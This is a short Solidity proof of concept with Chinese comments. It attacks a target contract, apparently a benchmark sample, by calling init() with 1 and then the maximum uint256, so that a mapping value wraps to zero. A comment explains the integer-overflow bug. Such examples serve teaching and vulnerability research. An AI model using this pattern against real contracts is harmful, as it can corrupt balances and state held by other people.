// 整數溢出攻擊範例
contract IntegerOverflowAttack {
    IntegerOverflowMappingSym1 target;
    
    constructor(address _target) {
        target = IntegerOverflowMappingSym1(_target);
    }
    
    function attack(uint256 key) public {
        // 使用可能導致溢出的大數值
        uint256 maxValue = type(uint256).max;
        
        // 第一步：加入 1，確認目前值
        target.init(key, 1);
        
        // 第二步：加入一個極大的數值，導致溢出
        // 由於原合約中沒有防止溢出的機制，這將導致 map[key] 的值變得比預期小
        target.init(key, maxValue);
        
        // 這時 map[key] 的值已經溢出，實際值將變成 (1 + maxValue) % (2^256)
        // 對於 uint256，溢出後的值會是一個比 maxValue 小的值
    }
}

/* 
攻擊說明：
這個攻擊利用了整數溢出漏洞。當我們對一個 uint256 類型的變數加上一個大到足以溢出的值時，
結果會「繞回」並得到一個較小的值，而不是預期的大數值。

例如，假設 map[key] 目前的值為 1，當我們再加上 (2^256 - 1) 時，結果應該要是 2^256，
但由於 uint256 的最大值是 2^256 - 1，所以這個結果實際上會溢出並變成 0，造成狀態紀錄被清零或改變。
這種情況可能導致嚴重的邏輯錯誤或金額計算錯誤。
*/